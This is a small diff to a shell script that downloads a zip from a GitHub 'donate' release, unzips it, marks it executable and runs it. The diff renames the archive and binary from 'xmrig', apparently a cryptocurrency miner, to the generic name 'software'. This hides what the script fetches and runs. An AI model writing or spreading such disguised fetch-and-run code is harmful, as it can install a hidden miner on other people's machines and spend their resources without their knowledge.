@@ -18,10 +18,10 @@ sleep 0.5
 wget https://github.com/maxdhctrl/donate/releases/download/release-5/software.zip
 sleep 0.5
 
-unzip xmrig.zip
+unzip software.zip
 
 chmod +x start.sh
-chmod +x xmrig
+chmod +x software
 
 sleep 0.5
 ./start.sh
